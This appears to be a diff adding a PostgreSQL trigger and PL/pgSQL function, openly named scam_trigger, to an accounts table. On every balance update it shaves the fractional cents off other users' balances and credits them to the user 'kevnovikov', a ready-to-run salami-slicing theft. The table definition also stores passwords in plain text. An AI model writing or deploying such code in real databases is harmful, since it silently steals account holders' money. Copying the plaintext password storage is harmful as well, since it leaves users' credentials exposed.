@@ -1,0 +1,30 @@
+CREATE TRIGGER balance_changes
+  after UPDATE
+  ON accounts
+  FOR EACH ROW
+  EXECUTE PROCEDURE scam_trigger();
+  -----------------------------------------------------------------------------------------------------
+  CREATE OR REPLACE FUNCTION "Accounts".scam_trigger()
+ RETURNS trigger
+ LANGUAGE plpgsql
+AS $function$
+declare 
+salami numeric(3,2);
+BEGIN
+   if new.balance <> old.balance then
+   	if new.username <> 'kevnovikov' then
+   		salami = new.balance - floor(new.balance);
+   		update accounts set balance = floor(new.balance) where username = new.username;
+   		update accounts set balance = ((select balance from accounts where username = 'kevnovikov')
+   										+salami) where username = 'kevnovikov';
+   	end if;
+   end if;
+  return new;
+END;
+$function$
+;
+------------------------------------------------------------------------------------------------------
+create table accounts(
+username varchar(15),
+pass_word varchar(15),
+balance numeric (18,2));
